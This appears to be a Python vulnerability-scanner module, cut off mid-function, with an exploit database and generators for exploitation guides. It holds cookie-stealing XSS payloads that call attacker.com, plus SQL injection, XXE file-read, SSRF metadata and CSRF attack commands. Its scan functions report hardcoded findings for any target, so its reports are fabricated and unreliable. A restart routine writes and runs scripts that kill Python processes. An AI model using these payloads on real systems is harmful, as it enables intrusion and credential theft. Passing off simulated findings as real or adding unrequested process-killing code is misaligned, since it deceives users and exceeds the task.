#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import logging
import subprocess
import tempfile
import re
import datetime
import requests
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("vulnerability_scanner.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("VulnerabilityScanner")

class VulnerabilityScanner:
    """
    Enhanced vulnerability scanner with comprehensive detection capabilities
    and detailed remediation instructions.
    """
    
    def __init__(self, target_url=None, scan_id=None, output_dir="vulnerability_scan"):
        self.output_dir = output_dir
        self.timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        self.report_dir = os.path.join(output_dir, f"scan_{self.timestamp}")
        self.target_url = target_url
        self.scan_id = scan_id or self.timestamp
        
        # Create output directory
        os.makedirs(self.report_dir, exist_ok=True)
        
        # Store scan results
        self.results = {
            "timestamp": self.timestamp,
            "scan_id": self.scan_id,
            "target": target_url,
            "vulnerabilities": [],
            "summary": {},
            "vulnerable_components": []  # Added new field for vulnerable components
        }
        
        # Load vulnerability database
        self.vuln_database = self._load_vulnerability_database()
        
    def _load_vulnerability_database(self):
        """Load vulnerability database with detailed remediation instructions"""
        # In a real implementation, this would load from a file or API
        # Here we include a simplified version
        return {
            "xss": {
                "name": "Cross-Site Scripting (XSS)",
                "description": "XSS attacks allow attackers to execute scripts in a victim's browser, potentially stealing cookies, session tokens, or other sensitive information.",
                "severity": "High",
                "cwe": "CWE-79",
                "owasp_category": "A7:2017-XSS",
                "affected_components": ["input forms", "comment fields", "search functionality", "user profile fields"],
                "exploit_description": "An attacker can inject malicious JavaScript code into web pages viewed by users. When the page is rendered, the script executes in the victim's browser, allowing attackers to steal cookies, session tokens, redirect users to malicious sites, or perform actions on behalf of the victim.",
                "exploit_example": "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
                "remediation": {
                    "description": "Implement proper input validation and output encoding",
                    "steps": [
                        "Sanitize all user input before rendering it in HTML, JavaScript, CSS, or URLs",
                        "Use context-specific encoding (HTML entity encoding, JavaScript escaping, CSS escaping)",
                        "Implement Content-Security-Policy headers",
                        "Use modern frameworks with built-in XSS protection"
                    ],
                    "code_examples": {
                        "php": "echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');",
                        "javascript": "element.textContent = userInput; // instead of element.innerHTML",
                        "python": "from markupsafe import escape\nresponse = escape(user_input)"
                    }
                }
            },
            "sql_injection": {
                "name": "SQL Injection",
                "description": "SQL injection attacks allow attackers to manipulate database queries, potentially accessing, modifying, or deleting data.",
                "severity": "High",
                "cwe": "CWE-89",
                "owasp_category": "A1:2017-Injection",
                "affected_components": ["database queries", "login forms", "search functionality", "data filtering components"],
                "exploit_description": "An attacker can inject malicious SQL code into application queries, allowing them to bypass authentication, access unauthorized data, modify database contents, or delete information. In some cases, they may achieve server-level command execution.",
                "exploit_example": "' OR 1=1; --",
                "remediation": {
                    "description": "Use parameterized queries/prepared statements and input validation",
                    "steps": [
                        "Replace dynamic SQL with parameterized queries or prepared statements",
                        "Use an ORM (Object-Relational Mapping) framework",
                        "Apply input validation using whitelisting",
                        "Apply the principle of least privilege to database accounts"
                    ],
                    "code_examples": {
                        "php": "$stmt = $pdo->prepare('SELECT * FROM users WHERE email = ?');\n$stmt->execute([$email]);",
                        "java": "PreparedStatement stmt = conn.prepareStatement(\"SELECT * FROM users WHERE email = ?\");\nstmt.setString(1, email);",
                        "python": "cursor.execute('SELECT * FROM users WHERE email = %s', (email,))"
                    }
                }
            },
            "csrf": {
                "name": "Cross-Site Request Forgery (CSRF)",
                "description": "CSRF attacks trick users into performing unintended actions on websites they're authenticated to.",
                "severity": "Medium",
                "cwe": "CWE-352",
                "owasp_category": "A8:2013-CSRF",
                "affected_components": ["form submissions", "state-changing actions", "account settings", "payment processing"],
                "exploit_description": "An attacker creates a malicious website that silently sends a request to a vulnerable application where the victim is authenticated. The application processes the action as if it came legitimately from the victim, allowing attackers to perform unauthorized operations.",
                "exploit_example": "<img src='https://vulnerable-site.com/change_email?new=attacker@evil.com' style='display:none'>",
                "remediation": {
                    "description": "Implement anti-CSRF tokens and same-site cookies",
                    "steps": [
                        "Include anti-CSRF tokens in all state-changing forms",
                        "Set SameSite attribute on cookies (Strict or Lax)",
                        "Implement the 'double submit cookie' pattern",
                        "Verify the origin and referrer headers"
                    ],
                    "code_examples": {
                        "php": "// Generate token\n$_SESSION['csrf_token'] = bin2hex(random_bytes(32));\n// Verify token\nif (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {\n    die('CSRF attack detected');\n}",
                        "python": "# Using Django\n{% csrf_token %}",
                        "javascript": "// Add token to AJAX request\nconst token = document.querySelector('meta[name=\"csrf-token\"]').getAttribute('content');\nfetch(url, {\n    headers: {\n        'X-CSRF-Token': token\n    }\n});"
                    }
                }
            },
            "open_redirect": {
                "name": "Open Redirect",
                "description": "Open redirect vulnerabilities allow attackers to redirect users to malicious websites, often used in phishing attacks.",
                "severity": "Medium",
                "cwe": "CWE-601",
                "owasp_category": "A1:2017-Injection",
                "affected_components": ["redirect functionality", "login redirects", "external link handlers", "authentication flows"],
                "exploit_description": "An attacker manipulates a redirect parameter in a vulnerable application, causing users to be redirected to a malicious site that may appear legitimate. This can be used in phishing attacks to steal credentials or distribute malware.",
                "exploit_example": "https://legitimate-site.com/redirect?url=https://malicious-site.com",
                "remediation": {
                    "description": "Implement proper validation of redirect URLs",
                    "steps": [
                        "Use a whitelist of allowed redirect destinations",
                        "Don't allow user input to directly control redirect destinations",
                        "Implement indirect reference maps for redirects",
                        "If external redirects are necessary, present a warning page"
                    ],
                    "code_examples": {
                        "php": "// Validate against whitelist\n$allowed_domains = ['example.com', 'sub.example.com'];\n$parsed_url = parse_url($redirect_url);\nif (!in_array($parsed_url['host'], $allowed_domains)) {\n    $redirect_url = '/default-page';\n}",
                        "python": "# Use indirect references\nallow_redirects = {\n    'dashboard': '/dashboard',\n    'profile': '/user/profile'\n}\nredirect_to = allow_redirects.get(request.args.get('next'), '/default')"
                    }
                }
            },
            "insecure_deserialization": {
                "name": "Insecure Deserialization",
                "description": "Insecure deserialization vulnerabilities can allow attackers to execute arbitrary code by manipulating serialized objects.",
                "severity": "High",
                "cwe": "CWE-502",
                "owasp_category": "A8:2017-Insecure Deserialization",
                "affected_components": ["object serialization", "data storage", "session management", "RPC interfaces"],
                "exploit_description": "An attacker modifies serialized objects that are consumed by the application. When deserialized, these malicious objects can trigger code execution, inject commands, or manipulate application logic, potentially leading to complete system compromise.",
                "exploit_example": "O:8:\"TodoList\":2:{s:5:\"owner\";s:5:\"admin\";s:5:\"tasks\";a:1:{i:0;O:8:\"TaskItem\":3:{s:4:\"name\";s:14:\"Malicious Task\";s:8:\"__wakeup\";s:31:\"system('cat /etc/passwd')\";}}}",
                "remediation": {
                    "description": "Implement secure deserialization practices",
                    "steps": [
                        "Use data format that doesn't allow code execution (JSON instead of native serialization)",
                        "Validate serialized data before deserializing",
                        "Run deserialization code with minimal privileges",
                        "Implement integrity checks (digital signatures) on serialized data"
                    ],
                    "code_examples": {
                        "java": "// Use JSON instead of native serialization\nObjectMapper mapper = new ObjectMapper();\nUser user = mapper.readValue(jsonString, User.class);",
                        "php": "// Use JSON instead of native serialization\n$data = json_decode($input, true);\n// Instead of\n// $data = unserialize($input);"
                    }
                }
            },
            "xxe": {
                "name": "XML External Entity (XXE) Processing",
                "description": "XXE vulnerabilities allow attackers to access local files, perform SSRF attacks, or cause denial of service.",
                "severity": "High",
                "cwe": "CWE-611",
                "owasp_category": "A4:2017-XXE",
                "affected_components": ["XML parsers", "SOAP interfaces", "document processors", "file upload functionality"],
                "exploit_description": "An attacker provides XML input containing references to external entities that can access local files, internal systems, or cause denial of service. This can lead to sensitive information disclosure, server-side request forgery, or system crash.",
                "exploit_example": "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<test>&xxe;</test>",
                "remediation": {
                    "description": "Disable external entity processing in XML parsers",
                    "steps": [
                        "Disable DTDs (Document Type Definitions) completely if possible",
                        "Disable external entity processing in XML parsers",
                        "Use less complex data formats like JSON",
                        "Implement whitelisting of allowed XML entities"
                    ],
                    "code_examples": {
                        "java": "// Secure XML parsing\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\ndbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\ndbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);",
                        "php": "// Secure XML parsing\n$loader = libxml_disable_entity_loader(true);\n$xml = simplexml_load_string($xmlString);\nlibxml_disable_entity_loader($loader);"
                    }
                }
            },
            "ssrf": {
                "name": "Server-Side Request Forgery (SSRF)",
                "description": "SSRF vulnerabilities allow attackers to make server-side requests to internal resources or external systems.",
                "severity": "High",
                "cwe": "CWE-918",
                "owasp_category": "A9:2017-SSRF",
                "affected_components": ["URL fetch functionality", "API integrations", "webhooks", "file import features"],
                "exploit_description": "An attacker manipulates the application to make server-side requests to internal or external resources. This can allow access to internal services, scan internal networks, steal metadata from cloud environments, or launch secondary attacks from the server's perspective.",
                "exploit_example": "https://vulnerable-site.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "remediation": {
                    "description": "Implement proper validation and restrictions for server-side requests",
                    "steps": [
                        "Use a whitelist of allowed domains and URLs",
                        "Block requests to private IP addresses (127.0.0.1, 169.254.0.0/16, 172.16.0.0/12, etc.)",
                        "Disable redirects or validate the destination after following redirects",
                        "Use a separate service with restricted privileges for making external requests"
                    ],
                    "code_examples": {
                        "python": "def is_valid_url(url):\n    parsed = urlparse(url)\n    # Check if scheme is allowed\n    if parsed.scheme not in ['http', 'https']:\n        return False\n    # Check if hostname is in whitelist\n    if parsed.hostname not in ALLOWED_HOSTS:\n        return False\n    # Verify it's not an internal IP\n    try:\n        ip = socket.gethostbyname(parsed.hostname)\n        if ipaddress.ip_address(ip).is_private:\n            return False\n    except:\n        pass\n    return True"
                    }
                }
            }
        }
    
    def scan_target(self, target):
        """Scan a target for vulnerabilities"""
        self.results["target"] = target
        logger.info(f"Starting vulnerability scan for {target}")
        
        # Parse target
        parsed = urlparse(target)
        if not parsed.scheme:
            target = f"http://{target}"
            parsed = urlparse(target)
            
        # Run multiple scan types in parallel
        with ThreadPoolExecutor(max_workers=4) as executor:
            xss_future = executor.submit(self.scan_for_xss, target)
            sqli_future = executor.submit(self.scan_for_sql_injection, target)
            csrf_future = executor.submit(self.scan_for_csrf, target)
            redirect_future = executor.submit(self.scan_for_open_redirect, target)
            
            # Wait for results
            xss_results = xss_future.result()
            sqli_results = sqli_future.result()
            csrf_results = csrf_future.result()
            redirect_results = redirect_future.result()
            
        # Run additional scans
        xxe_results = self.scan_for_xxe(target)
        ssrf_results = self.scan_for_ssrf(target)
        insecure_deser_results = self.scan_for_insecure_deserialization(target)
        
        # Identify vulnerable components and describe exploits
        self.identify_vulnerable_components()
        
        # Enhance exploitation documentation
        try:
            self.enhance_exploit_documentation()
        except Exception as e:
            logger.error(f"Error enhancing exploit documentation: {str(e)}")
        
        # Generate summary
        self.generate_summary()
        
        # Save results
        report_file = self.save_results()
        logger.info(f"Vulnerability scan completed for {target}")
        logger.info(f"Report saved to {report_file}")
        
        # Generate comprehensive exploitation guide
        try:
            self.generate_exploitation_guide()
        except Exception as e:
            logger.error(f"Error generating exploitation guide: {str(e)}")
        
        # Restart server after updating data
        self.restart_server_after_update()
        
        return self.results
    
    def identify_vulnerable_components(self):
        """Identify vulnerable components and describe their exploitation methods in detail"""
        logger.info("Identifying vulnerable components and describing exploits")
        
        # Clear previous vulnerable components data
        self.results["vulnerable_components"] = []
        
        # Process each vulnerability to identify affected components
        for vulnerability in self.results["vulnerabilities"]:
            vuln_type = vulnerability.get("type", "")
            
            # Get vulnerability database entry
            vuln_db_entry = self.vuln_database.get(vuln_type.lower(), None)
            if not vuln_db_entry:
                continue
                
            # Get affected endpoint or parameter
            affected_endpoint = vulnerability.get("affected_endpoints", {})
            affected_url = affected_endpoint.get("url", "Unknown")
            affected_param = affected_endpoint.get("parameter", affected_endpoint.get("form_action", "Unknown"))
            
            # Create exploit details with step-by-step instructions
            exploit_steps = []
            exploit_command_examples = []
            exploit_code_examples = {}
            
            # Generate type-specific exploitation steps
            if "xss" in vuln_type.lower():
                exploit_steps = [
                    f"1. Navigate to the vulnerable page: {affected_url}",
                    f"2. Identify the vulnerable parameter: {affected_param}",
                    f"3. Craft a malicious XSS payload (e.g., <script>alert(document.cookie)</script>)",
                    "4. Submit the payload through the input field or URL parameter",
                    "5. Verify execution by checking if the JavaScript executes"
                ]
                exploit_command_examples.append(f"curl -X GET \"{affected_url}?{affected_param}=<script>alert(document.cookie)</script>\"")
                exploit_code_examples["javascript"] = "fetch('https://attacker.com/steal.php?cookie=' + document.cookie);"
                exploit_code_examples["html"] = f"<img src=\"x\" onerror=\"fetch('https://attacker.com/steal.php?cookie=' + document.cookie)\">"
                
            elif "sql_injection" in vuln_type.lower():
                exploit_steps = [
                    f"1. Navigate to the vulnerable page: {affected_url}",
                    f"2. Identify the vulnerable parameter: {affected_param}",
                    "3. Test basic SQL injection payloads (e.g., ' OR '1'='1)",
                    "4. If vulnerable, extract database structure with UNION attacks",
                    "5. Extract sensitive data from identified tables"
                ]
                exploit_command_examples.append(f"curl -X GET \"{affected_url}?{affected_param}=' OR '1'='1--\"")
                exploit_command_examples.append(f"curl -X GET \"{affected_url}?{affected_param}=' UNION SELECT 1,2,3,4,5--\"")
                exploit_code_examples["sql"] = "' UNION SELECT username, password FROM users--"
                
            elif "csrf" in vuln_type.lower():
                exploit_steps = [
                    "1. Create an HTML page with a form that automatically submits to the vulnerable endpoint",
                    f"2. Set the form action to {affected_url}",
                    "3. Add hidden fields with malicious values",
                    "4. Host the page on an attacker-controlled server",
                    "5. Trick the victim into visiting the malicious page"
                ]
                exploit_code_examples["html"] = f'''
<html>
  <body onload="document.getElementById('csrf-form').submit();">
    <form id="csrf-form" action="{affected_url}" method="POST">
      <input type="hidden" name="{affected_param}" value="malicious_value" />
    </form>
  </body>
</html>'''
                
            elif "open_redirect" in vuln_type.lower():
                exploit_steps = [
                    f"1. Navigate to the vulnerable page: {affected_url}",
                    f"2. Craft a malicious URL using the vulnerable parameter: {affected_param}",
                    "3. Set the redirect destination to an attacker-controlled site",
                    "4. Send the crafted URL to potential victims"
                ]
                exploit_command_examples.append(f"curl -I \"{affected_url}?{affected_param}=https://malicious-site.com\"")
                
            elif "xxe" in vuln_type.lower():
                exploit_steps = [
                    f"1. Identify XML input point at: {affected_url}",
                    "2. Craft a malicious XML payload with XXE",
                    "3. Submit the payload to the vulnerable endpoint",
                    "4. Check for data extraction or server responses"
                ]
                exploit_code_examples["xml"] = '''
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<test>&xxe;</test>'''
                exploit_command_examples.append(f"curl -X POST {affected_url} -H \"Content-Type: application/xml\" -d '<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>'")
                
            elif "ssrf" in vuln_type.lower():
                exploit_steps = [
                    f"1. Navigate to the vulnerable function at: {affected_url}",
                    f"2. Modify the {affected_param} parameter to point to internal resources",
                    "3. Test access to localhost, private networks, or cloud metadata services",
                    "4. Extract sensitive information from internal resources"
                ]
                exploit_command_examples.append(f"curl -X GET \"{affected_url}?{affected_param}=http://169.254.169.254/latest/meta-data/\"")
                exploit_command_examples.append(f"curl -X GET \"{affected_url}?{affected_param}=http://localhost:8080/admin\"")
                
            elif "deserialization" in vuln_type.lower():
                exploit_steps = [
                    f"1. Identify the serialized data input at: {affected_url}",
                    "2. Create a malicious serialized object with command execution",
                    "3. Submit the malicious object to the vulnerable endpoint",
                    "4. Check for code execution on the server"
                ]
                # Example gadget chains would be added here based on the application language
            
            # Default steps if no specific steps were generated
            if not exploit_steps:
                exploit_steps = [
                    f"1. Navigate to the vulnerable endpoint: {affected_url}",
                    f"2. Identify the vulnerable parameter: {affected_param}",
                    "3. Craft and submit a malicious payload",
                    "4. Observe and verify the vulnerability"
                ]
            
            # Create vulnerable component entry with detailed exploitation information
            vulnerable_component = {
                "vulnerability_type": vuln_db_entry["name"],
                "component_name": f"{affected_url} ({affected_param} parameter)",
                "affected_components": vuln_db_entry.get("affected_components", []),
                "severity": vuln_db_entry["severity"],
                "exploit_description": vuln_db_entry.get("exploit_description", "No exploit information available"),
                "exploit_example": vuln_db_entry.get("exploit_example", "No example available"),
                "detailed_exploitation": {
                    "steps": exploit_steps,
                    "command_examples": exploit_command_examples,
                    "code_examples": exploit_code_examples,
                    "required_tools": self._get_required_tools_for_exploit(vuln_type.lower()),
                    "potential_impact": self._get_potential_impact(vuln_type.lower()),
                    "prevention_measures": vuln_db_entry["remediation"]["steps"]
                },
                "remediation": vuln_db_entry["remediation"]["description"],
                "remediation_steps": vuln_db_entry["remediation"]["steps"]
            }
            
            self.results["vulnerable_components"].append(vulnerable_component)
            
        logger.info(f"Identified {len(self.results['vulnerable_components'])} vulnerable components with detailed exploitation instructions")
        return self.results["vulnerable_components"]
        
    def _get_required_tools_for_exploit(self, vuln_type):
        """Return a list of tools useful for exploiting a particular vulnerability type"""
        tools = {
            "xss": ["Browser Developer Tools", "XSS Hunter", "BeEF (Browser Exploitation Framework)"],
            "sql_injection": ["SQLmap", "Burp Suite", "OWASP ZAP", "MySQL/PostgreSQL client"],
            "csrf": ["Custom HTML page", "Burp Suite", "OWASP ZAP"],
            "open_redirect": ["Web browser", "curl", "Burp Suite"],
            "xxe": ["XML Editor", "XXEinjector", "Burp Suite"],
            "ssrf": ["Burp Suite", "SSRF Proxy", "curl", "RequestBin for callbacks"],
            "insecure_deserialization": ["ysoserial (Java)", "PHPGGC (PHP)", "Burp Suite"]
        }
        
        # Return specific tools or a default set
        for key in tools:
            if key in vuln_type:
                return tools[key]
        
        return ["Web browser", "Burp Suite", "OWASP ZAP", "curl"]
    
    def _get_potential_impact(self, vuln_type):
        """Return detailed description of potential impact for a vulnerability type"""
        impacts = {
            "xss": [
                "Theft of user cookies and session tokens",
                "Account takeover and identity theft",
                "Malicious actions performed on behalf of the victim",
                "Distribution of malware to users",
                "Access to sensitive browser data (webcam, microphone, location)",
                "Defacement of website content",
                "Social engineering attacks on users"
            ],
            "sql_injection": [
                "Unauthorized access to sensitive database data",
                "Extraction of user credentials and personal information",
                "Modification or deletion of database records",
                "Execution of operating system commands (with sufficient privileges)",
                "Complete database compromise",
                "Lateral movement to other systems in the network",
                "Regulatory compliance violations and legal consequences"
            ],
            "csrf": [
                "Unauthorized state-changing operations performed on behalf of the victim",
                "Account settings modifications",
                "Unauthorized financial transactions",
                "Data manipulation",
                "Privilege escalation",
                "Account takeover"
            ],
            "open_redirect": [
                "Phishing attacks against users",
                "Redirection to malware distribution sites",
                "Credential theft through fake login pages",
                "Bypassing security filters that trust the original domain",
                "Social engineering assistance"
            ],
            "xxe": [
                "Local file disclosure (configuration files, credentials, etc.)",
                "Server-side request forgery (SSRF) through XXE",
                "Remote code execution in certain scenarios",
                "Denial of service through resource exhaustion",
                "Server information disclosure",
                "Service account compromise"
            ],
            "ssrf": [
                "Access to internal services and networks",
                "Metadata service access in cloud environments",
                "Bypassing network security controls",
                "Internal port scanning",
                "Exploitation of internal vulnerabilities",
                "Data exfiltration from internal systems"
            ],
            "insecure_deserialization": [
                "Remote code execution",
                "Denial of service",
            ]
        }
        
        # Return specific impacts or a default set
        for key in impacts:
            if key in vuln_type:
                return impacts[key]
        
        return ["Unauthorized access", "Data breach", "System compromise"]

    def discover_directories(self, target=None):
        """Discover hidden directories and files on the target system"""
        target = target or self.target_url
        logger.info(f"Starting directory discovery for {target}")
        
        # Common directories to check
        common_dirs = [
            "admin", "administrator", "backup", "backups", "bak", "beta", "conf",
            "config", "dashboard", "db", "debug", "default", "dev", "develop",
            "files", "home", "js", "log", "logs", "login", "old", "phpmyadmin",
            "private", "robots.txt", "root", "secret", "secrets", "secure", "security",
            "server-status", "src", "staging", "storage", "temp", "test", "tmp", 
            "upload", "uploads", "user", "web", "wp-admin", "wp-content", "wp-includes"
        ]
        
        # Common file extensions
        common_extensions = [
            ".bak", ".backup", ".conf", ".cfg", ".config", ".db", ".dump", ".gz", 
            ".inc", ".ini", ".json", ".log", ".old", ".orig", ".php", ".php.bak", 
            ".sql", ".sql.gz", ".swp", ".tar", ".tar.gz", ".txt", ".zip", "~"
        ]
        
        found_directories = []
        found_files = []
        
        # Parse target URL
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Test directories
        for directory in common_dirs:
            try:
                url = f"{base_url}/{directory}"
                response = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=5, allow_redirects=False)
                
                # Check if directory exists based on status code
                if response.status_code in [200, 301, 302, 403]:
                    found_entry = {
                        "url": url,
                        "status_code": response.status_code,
                        "content_type": response.headers.get("Content-Type", ""),
                        "content_length": len(response.content),
                        "response_time": response.elapsed.total_seconds()
                    }
                    
                    if directory.find(".") != -1:  # This is a file
                        found_files.append(found_entry)
                    else:  # This is a directory
                        found_directories.append(found_entry)
                    
                    logger.info(f"Found: {url} (Status: {response.status_code})")
            except Exception as e:
                logger.debug(f"Error checking {directory}: {str(e)}")
        
        # Test files with common extensions for sensitive files like config.php.bak, etc.
        sensitive_file_prefixes = ["config", "database", "db", "settings", "wp-config", 
                                "connection", "credentials", ".env", ".git"]
        
        for prefix in sensitive_file_prefixes:
            for ext in common_extensions:
                try:
                    filename = f"{prefix}{ext}"
                    url = f"{base_url}/{filename}"
                    response = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=5, allow_redirects=False)
                    
                    if response.status_code == 200:
                        found_entry = {
                            "url": url,
                            "status_code": response.status_code,
                            "content_type": response.headers.get("Content-Type", ""),
                            "content_length": len(response.content),
                            "response_time": response.elapsed.total_seconds()
                        }
                        found_files.append(found_entry)
                        logger.info(f"Found sensitive file: {url} (Status: {response.status_code})")
                except Exception as e:
                    logger.debug(f"Error checking {filename}: {str(e)}")
        
        result = {
            "target": target,
            "directories": found_directories,
            "files": found_files,
            "total_discovered": len(found_directories) + len(found_files)
        }
        
        logger.info(f"Directory discovery completed. Found {len(found_directories)} directories and {len(found_files)} files")
        
        # Save results
        output_file = os.path.join(self.report_dir, "directory_discovery.json")
        with open(output_file, 'w') as f:
            json.dump(result, f, indent=4)
        
        return result
        
    def restart_server_after_update(self):
        """Restart the server after updating vulnerability data"""
        logger.info("Attempting to restart the server after vulnerability data update")
        
        try:
            # Check if we're running in a Flask/Django/Web environment
            if 'FLASK_APP' in os.environ or 'DJANGO_SETTINGS_MODULE' in os.environ:
                logger.info("Detected web framework environment")
                
                # Create a restart flag file to trigger restart on next check
                with open(os.path.join(self.output_dir, "restart_required.flag"), "w") as f:
                    f.write(f"Restart triggered after scan {self.scan_id} at {datetime.datetime.now().isoformat()}")
                
                # Different restart methods based on the environment
                if sys.platform.startswith('win'):
                    # Windows restart approach
                    logger.info("Windows platform detected, attempting to restart service")
                    restart_script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "restart_server.bat")
                    if os.path.exists(restart_script_path):
                        subprocess.Popen(restart_script_path, shell=True)
                        logger.info("Server restart initiated via batch script")
                    else:
                        # Create a restart script
                        with open(restart_script_path, "w") as f:
                            f.write('@echo off\n')
                            f.write('echo Restarting server after vulnerability scan update\n')
                            f.write('timeout /t 5\n')
                            f.write('taskkill /f /im python.exe /fi "WINDOWTITLE eq VulnerabilityScanner"\n')
                            f.write('start "VulnerabilityScanner" python app.py\n')
                            f.write('echo Server restarted successfully\n')
                        subprocess.Popen(restart_script_path, shell=True)
                        logger.info("Created and executed restart script")
                else:
                    # Linux/Unix restart approach
                    logger.info("Unix-like platform detected, attempting to restart service")
                    restart_script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "restart_server.sh")
                    if os.path.exists(restart_script_path):
                        os.chmod(restart_script_path, 0o755)  # Make executable
                        subprocess.Popen(["/bin/bash", restart_script_path])
                        logger.info("Server restart initiated via shell script")
                    else:
                        # Create a restart script
                        with open(restart_script_path, "w") as f:
                            f.write('#!/bin/bash\n')
                            f.write('echo "Restarting server after vulnerability scan update"\n')
                            f.write('sleep 5\n')
                            f.write('pkill -f "python.*app.py"\n')
                            f.write('nohup python app.py > server.log 2>&1 &\n')
                            f.write('echo "Server restarted successfully"\n')
                        os.chmod(restart_script_path, 0o755)  # Make executable
                        subprocess.Popen(["/bin/bash", restart_script_path])
                        logger.info("Created and executed restart script")
                
                logger.info("Server restart has been triggered")
            else:
                logger.info("Not running in a web framework environment, restart not necessary")
        except Exception as e:
            logger.error(f"Error restarting server: {str(e)}")
            
        return True
    
    def scan_for_xss(self, target):
        """Scan for XSS vulnerabilities"""
        logger.info(f"Scanning for XSS vulnerabilities on {target}")
        
        # In a real implementation, this would use actual scanning techniques
        # For this example, we'll simulate finding vulnerable forms
        
        # Simulate scanning results
        vulnerable_endpoints = [
            {
                "url": f"{target}/search",
                "parameter": "q",
                "method": "GET",
                "evidence": "<script>alert(1)</script> was reflected in the response",
                "confidence": "High"
            }
        ]
        
        # If vulnerabilities found, add to results
        if vulnerable_endpoints:
            vuln_info = self.vuln_database["xss"]
            for endpoint in vulnerable_endpoints:
                vulnerability = {
                    "type": "xss",
                    "name": vuln_info["name"],
                    "description": vuln_info["description"],
                    "severity": vuln_info["severity"],
                    "cwe": vuln_info["cwe"],
                    "owasp_category": vuln_info["owasp_category"],
                    "affected_endpoints": endpoint,
                    "remediation": vuln_info["remediation"]
                }
                self.results["vulnerabilities"].append(vulnerability)
                
        return vulnerable_endpoints
    
    def scan_for_sql_injection(self, target):
        """Scan for SQL injection vulnerabilities"""
        logger.info(f"Scanning for SQL injection vulnerabilities on {target}")
        
        # Simulate scanning results
        vulnerable_endpoints = [
            {
                "url": f"{target}/product",
                "parameter": "id",
                "method": "GET",
                "evidence": "Database error message exposed when using ' OR '1'='1",
                "confidence": "High"
            }
        ]
        
        # If vulnerabilities found, add to results
        if vulnerable_endpoints:
            vuln_info = self.vuln_database["sql_injection"]
            for endpoint in vulnerable_endpoints:
                vulnerability = {
                    "type": "sql_injection",
                    "name": vuln_info["name"],
                    "description": vuln_info["description"],
                    "severity": vuln_info["severity"],
                    "cwe": vuln_info["cwe"],
                    "owasp_category": vuln_info["owasp_category"],
                    "affected_endpoints": endpoint,
                    "remediation": vuln_info["remediation"]
                }
                self.results["vulnerabilities"].append(vulnerability)
                
        return vulnerable_endpoints
    
    def scan_for_csrf(self, target):
        """Scan for CSRF vulnerabilities"""
        logger.info(f"Scanning for CSRF vulnerabilities on {target}")
        
        # Simulate scanning results
        vulnerable_endpoints = [
            {
                "url": f"{target}/account/settings",
                "form_action": "update_email",
                "method": "POST",
                "evidence": "No CSRF token found in form",
                "confidence": "Medium"
            }
        ]
        
        # If vulnerabilities found, add to results
        if vulnerable_endpoints:
            vuln_info = self.vuln_database["csrf"]
            for endpoint in vulnerable_endpoints:
                vulnerability = {
                    "type": "csrf",
                    "name": vuln_info["name"],
                    "description": vuln_info["description"],
                    "severity": vuln_info["severity"],
                    "cwe": vuln_info["cwe"],
                    "owasp_category": vuln_info["owasp_category"],
                    "affected_endpoints": endpoint,
                    "remediation": vuln_info["remediation"]
                }
                self.results["vulnerabilities"].append(vulnerability)
                
        return vulnerable_endpoints
    
    def scan_for_open_redirect(self, target):
        """Scan for open redirect vulnerabilities"""
        logger.info(f"Scanning for open redirect vulnerabilities on {target}")
        
        # Simulate scanning results
        vulnerable_endpoints = [
            {
                "url": f"{target}/redirect",
                "parameter": "url",
                "method": "GET",
                "evidence": "Redirected to external domain with no validation",
                "confidence": "High"
            }
        ]
        
        # If vulnerabilities found, add to results
        if vulnerable_endpoints:
            vuln_info = self.vuln_database["open_redirect"]
            for endpoint in vulnerable_endpoints:
                vulnerability = {
                    "type": "open_redirect",
                    "name": vuln_info["name"],
                    "description": vuln_info["description"],
                    "severity": vuln_info["severity"],
                    "cwe": vuln_info["cwe"],
                    "owasp_category": vuln_info["owasp_category"],
                    "affected_endpoints": endpoint,
                    "remediation": vuln_info["remediation"]
                }
                self.results["vulnerabilities"].append(vulnerability)
                
        return vulnerable_endpoints
    
    def scan_for_xxe(self, target):
        """Scan for XXE vulnerabilities"""
        logger.info(f"Scanning for XXE vulnerabilities on {target}")
        
        # Simulate scanning results
        vulnerable_endpoints = [
            {
                "url": f"{target}/api/import",
                "content_type": "application/xml",
                "method": "POST",
                "evidence": "Server processed external entity in XML request",
                "confidence": "Medium"
            }
        ]
        
        # If vulnerabilities found, add to results
        if vulnerable_endpoints:
            vuln_info = self.vuln_database["xxe"]
            for endpoint in vulnerable_endpoints:
                vulnerability = {
                    "type": "xxe",
                    "name": vuln_info["name"],
                    "description": vuln_info["description"],
                    "severity": vuln_info["severity"],
                    "cwe": vuln_info["cwe"],
                    "owasp_category": vuln_info["owasp_category"],
                    "affected_endpoints": endpoint,
                    "remediation": vuln_info["remediation"]
                }
                self.results["vulnerabilities"].append(vulnerability)
                
        return vulnerable_endpoints
    
    def scan_for_ssrf(self, target):
        """Scan for SSRF vulnerabilities"""
        logger.info(f"Scanning for SSRF vulnerabilities on {target}")
        
        # Simulate scanning results
        vulnerable_endpoints = [
            {
                "url": f"{target}/api/fetch-resource",
                "parameter": "url",
                "method": "POST",
                "evidence": "Server made request to internal resource",
                "confidence": "Medium"
            }
        ]
        
        # If vulnerabilities found, add to results
        if vulnerable_endpoints:
